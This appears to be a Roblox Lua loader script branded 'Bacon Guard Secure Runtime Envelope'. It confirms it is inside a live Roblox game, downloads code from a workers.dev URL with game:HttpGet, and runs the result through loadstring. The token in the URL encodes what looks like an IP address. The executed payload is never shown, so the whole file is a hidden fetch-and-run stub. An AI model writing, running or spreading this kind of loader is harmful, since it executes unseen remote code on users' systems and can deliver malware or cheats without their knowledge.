--[=[
    [Bacon Guard Secure Runtime Envelope]
    Build: Protected Runtime
    Notice: Direct raw access is prohibited. Execute via loadstring in Roblox.
]=]
return (function()
    local p = pcall
    local isRoblox = p(function() return game:GetService("Players") end)
    if not isRoblox then
        return print("[Bacon Guard] Direct access prohibited. Live Roblox runtime required.")
    end

    local url = "https://paste-web.baconbossscript.workers.dev/api/stream/DIM28h3MLK?k=eyJpZCI6IkRJTTI4aDNNTEsiLCJpcCI6IjM4LjE1NC4xNTMuMTA2IiwiZXhwIjoxNzkzMzUyNzMxLCJub25jZSI6Ijg3NzhkZmM1ODc1ODQ0OWIifQ.K6mH7cc95g6hFgufbOT76ZHd2ouiL68fXt2bfcMt5nI"
    local ok, src = p(function()
        return game:HttpGet(url)
    end)

    if ok and src and #src > 10 then
        local fn, err = loadstring(src)
        if fn then
            return fn()
        else
            error("[Bacon Guard] Execution error: " .. tostring(err))
        end
    else
        warn("[Bacon Guard] Handshake failed or token expired. Please re-run loadstring.")
    end
end)()
